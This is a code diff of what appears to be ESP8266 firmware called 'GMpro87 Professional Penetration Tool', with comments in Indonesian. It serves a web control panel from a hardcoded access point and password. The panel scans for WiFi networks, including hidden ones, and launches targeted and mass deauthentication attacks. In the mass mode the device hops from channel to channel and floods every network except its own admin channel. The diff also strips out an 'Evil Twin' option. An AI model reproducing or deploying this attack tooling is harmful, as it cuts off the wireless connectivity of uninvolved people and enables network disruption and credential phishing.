@@ -1,5 +1,4 @@
 /* * PROJECT: GMpro87 Professional Penetration Tool
- * FITUR: Mass Deauth, Anti-Self-Deauth, Scan Hidden, Evil Twin
  * SSID: GMpro | PASS: Sangkur87
  */
 
@@ -10,7 +9,8 @@
 #include <ESPAsyncWebServer.h>
 #include <LittleFS.h>
 
-// SDK Deauther Core
+// SDK Deauther Core - Pastikan Library ini ada di folder /libraries
+#include "A_Config.h" 
 #include "Attack.h"
 #include "Scan.h"
 
@@ -32,7 +32,7 @@ unsigned long lastHop = 0;
 unsigned long prevBlink = 0;
 int currentCh = 1;
 
-// --- UI WEB (HTML & CSS) ---
+// --- UI WEB ---
 const char INDEX_HTML[] PROGMEM = R"raw(
 <!DOCTYPE html>
 <html>
@@ -41,7 +41,6 @@ const char INDEX_HTML[] PROGMEM = R"raw(
     <style>
         body { background:#050505; color:#0f0; font-family:monospace; text-align:center; margin:0; }
         .header { background:#111; padding:20px; border-bottom:2px solid #0f0; box-shadow:0 0 15px #0f0; }
-        .logo { font-size:26px; font-weight:bold; letter-spacing:4px; }
         .tabs { display:flex; background:#1a1a1a; position:sticky; top:0; }
         .tab { flex:1; padding:15px; cursor:pointer; border-bottom:2px solid #333; }
         .tab.active { background:#0f0; color:#000; font-weight:bold; }
@@ -49,35 +48,28 @@ const char INDEX_HTML[] PROGMEM = R"raw(
         .content.active { display:block; }
         .btn { background:#111; border:1px solid #0f0; color:#0f0; padding:14px; width:100%; margin:8px 0; border-radius:5px; font-weight:bold; cursor:pointer; }
         .btn.on { background:#f00; border-color:#f00; color:#fff; box-shadow:0 0 15px #f00; }
-        .wifi-row { display:grid; grid-template-columns: 2fr 1fr 1fr 1fr; background:#111; padding:10px; margin:5px 0; font-size:11px; border-left:3px solid #0f0; }
+        .wifi-row { display:grid; grid-template-columns: 2fr 1fr 1fr 1fr; background:#111; padding:10px; margin:5px 0; font-size:11px; border-left:3px solid #0f0; text-align:left;}
         .log-box { background:#000; border:1px solid #333; height:130px; overflow-y:scroll; padding:10px; text-align:left; font-size:11px; color:#0f0; margin-top:15px; }
     </style>
 </head>
 <body>
-    <div class="header"><div class="logo">GMPRO87</div><small id="stat">ADMIN SECURE: ACTIVE</small></div>
+    <div class="header"><div>GMPRO87</div><small>ADMIN SECURE: ON CH 1</small></div>
     <div class="tabs">
         <div id="bt1" class="tab active" onclick="sh(1)">CONSOLE</div>
         <div id="bt2" class="tab" onclick="sh(2)">SETTING</div>
     </div>
-
     <div id="t1" class="content active">
         <button class="btn" onclick="sc()">SCAN & UNMASK HIDDEN</button>
-        <div class="wifi-row" style="background:#222"><div>SSID</div><div>CH</div><div>SIG</div><div>SEL</div></div>
         <div id="wl"></div>
         <hr style="border:0.5px solid #333">
         <button id="atk1" class="btn" onclick="tk('deauth','atk1')">DEAUTH TARGET</button>
-        <button id="atk2" class="btn" onclick="tk('etwin','atk2')">EVIL TWIN TRUE</button>
         <button id="atk3" class="btn" onclick="tk('mass','atk3')">MASS DEAUTH RUSUH</button>
-        <div class="log-box" id="lg">Sistem Siap Lapangan...</div>
+        <div class="log-box" id="lg">Sistem Siap...</div>
     </div>
-
     <div id="t2" class="content">
-        <h3>Attack Settings</h3>
-        <label>HIDDEN SCAN: </label><button class="btn" id="h_btn" onclick="toggleHidden()">MODE: NORMAL</button>
-        <input type="text" id="target" placeholder="Target SSID" style="width:90%;padding:10px;margin:10px 0;background:#111;color:#0f0;border:1px solid #444;">
-        <button class="btn" style="border-color:#fff; color:#fff" onclick="sv()">SAVE & APPLY</button>
+        <h3>Settings</h3>
+        <button class="btn" id="h_btn" onclick="toggleHidden()">SCAN MODE: NORMAL</button>
     </div>
-
     <script>
         function sh(n){
             document.querySelectorAll('.content').forEach(c=>c.classList.remove('active'));
@@ -93,12 +85,13 @@ const char INDEX_HTML[] PROGMEM = R"raw(
         }
         function toggleHidden(){
             let b=document.getElementById('h_btn');
-            if(b.innerText=="MODE: NORMAL"){ b.innerText="MODE: DEEP SCAN"; b.style.color="yellow"; fetch('/hscan?m=on');}
-            else { b.innerText="MODE: NORMAL"; b.style.color="#0f0"; fetch('/hscan?m=off');}
+            let m=(b.innerText=="SCAN MODE: NORMAL")?"on":"off";
+            fetch('/hscan?m='+m);
+            b.innerText=(m=="on")?"SCAN MODE: DEEP":"SCAN MODE: NORMAL";
+            b.style.color=(m=="on")?"yellow":"#0f0";
         }
-        function sc(){ log("Scanning WiFi..."); fetch('/scan').then(r=>r.text()).then(d=>{document.getElementById('wl').innerHTML=d;}); }
+        function sc(){ log("Scanning..."); fetch('/scan').then(r=>r.text()).then(d=>{document.getElementById('wl').innerHTML=d;}); }
         function log(m){ let l=document.getElementById('lg'); l.innerHTML+="<br>> "+m; l.scrollTop=l.scrollHeight; }
-        function sv(){ log("Settings Saved."); }
     </script>
 </body>
 </html>
@@ -109,10 +102,13 @@ void setup() {
     pinMode(LED_PIN, OUTPUT);
     LittleFS.begin();
 
-    // 1. WiFi Admin (Aman dari Deauth karena channel tetap & MAC Whitelist otomatis)
+    // --- INISIALISASI SDK ---
+    scanObj.begin();
+    attack.begin();
+
+    // 1. WiFi Admin (Channel 1 tetap)
     WiFi.mode(WIFI_AP_STA);
-    WiFi.softAP(apSSID, apPASS, 1, 0); // Channel 1, Hidden 0
-    
+    WiFi.softAP(apSSID, apPASS, 1, 0); 
     dnsServer.start(53, "*", WiFi.softAPIP());
 
     server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
@@ -120,14 +116,19 @@ void setup() {
     });
 
     server.on("/scan", HTTP_GET, [](AsyncWebServerRequest *request){
-        scanObj.start(0); // Scan semua (termasuk hidden via Probe)
-        String out = "";
+        scanObj.start(0); 
+        String out = "<div class='wifi-row' style='background:#222'><div>SSID</div><div>CH</div><div>SIG</div><div>SEL</div></div>";
         for(int i=0; i<scanObj.count(); i++){
             String name = scanObj.getSSID(i);
-            if(name == "") name = "[HIDDEN]"; // Unmask label
+            if(name == "" || name.length() == 0) name = "[HIDDEN]";
             out += "<div class='wifi-row'><div>"+name+"</div><div>"+String(scanObj.getChannel(i))+"</div><div>"+String(scanObj.getRSSI(i))+"</div><div><input type='checkbox'></div></div>";
         }
         request->send(200, "text/plain", out);
+    });
+
+    server.on("/hscan", HTTP_GET, [](AsyncWebServerRequest *request){
+        if(request->hasParam("m")) scanHidden = (request->getParam("m")->value() == "on");
+        request->send(200, "text/plain", "OK");
     });
 
     server.on("/cmd", HTTP_GET, [](AsyncWebServerRequest *request){
@@ -136,6 +137,7 @@ void setup() {
         
         if(type == "mass") {
             massDeauth = (action == "START");
+            if(!massDeauth) attack.stopAll();
             blinkInterval = massDeauth ? 80 : 1000;
         } else if(type == "deauth") {
             if(action == "START") {
@@ -158,24 +160,21 @@ void loop() {
     // 2. LOGIKA MASS DEAUTH + CHANNEL HOPPING
     if (massDeauth) {
         unsigned long now = millis();
-        if (now - lastHop >= 200) { // Hop tiap 200ms
+        if (now - lastHop >= 200) { 
             lastHop = now;
             currentCh++;
             if (currentCh > 11) currentCh = 1;
             
-            // LOMPAT CHANNEL
             wifi_set_channel(currentCh);
             
-            // KIRIM PAKET RUSUH (Kecuali Channel 1 agar Admin tetap stabil)
+            // Kirim Deauth hanya jika bukan di Channel Admin (Ch 1)
             if (currentCh != 1) { 
                 attack.start(true, false, false, false, 0); 
             }
         }
     }
 
-    // 3. LOGIKA LED STROBO / ATTACK
-    if (LittleFS.exists("/found.txt")) blinkInterval = 40; // Strobo
-
+    // 3. LOGIKA LED
     unsigned long cur = millis();
     if (cur - prevBlink >= (unsigned long)blinkInterval) {
         prevBlink = cur;
